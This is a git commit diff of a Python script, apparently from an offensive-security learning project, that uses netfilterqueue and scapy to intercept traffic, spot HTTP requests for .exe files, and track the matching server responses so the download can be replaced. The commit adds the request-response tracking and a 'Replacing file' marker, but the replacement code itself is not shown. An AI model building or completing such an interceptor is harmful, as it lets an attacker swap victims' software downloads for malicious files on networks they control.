f262fdf7bd036f917640f8453de1e198fbbf3a36
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-04-25 18:49:22 +0530

    Intercepted HTTP Requests

--- replace_downloads.py
+++ replace_downloads.py
@@ -1,18 +1,21 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
     if scapy_packet.haslayer(scapy.Raw):
-        print(scapy_packet.show())
         if scapy_packet[scapy.TCP].dport == 80:
-            print("HTTP Request")
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
                 print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP Response")
-            print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+]Replacing file")
+                print(scapy_packet.show())
     packet.accept() # This will accept the packet and forward it to the client computer allowing him to go that perticular website
 
 queue = netfilterqueue.NetfilterQueue()
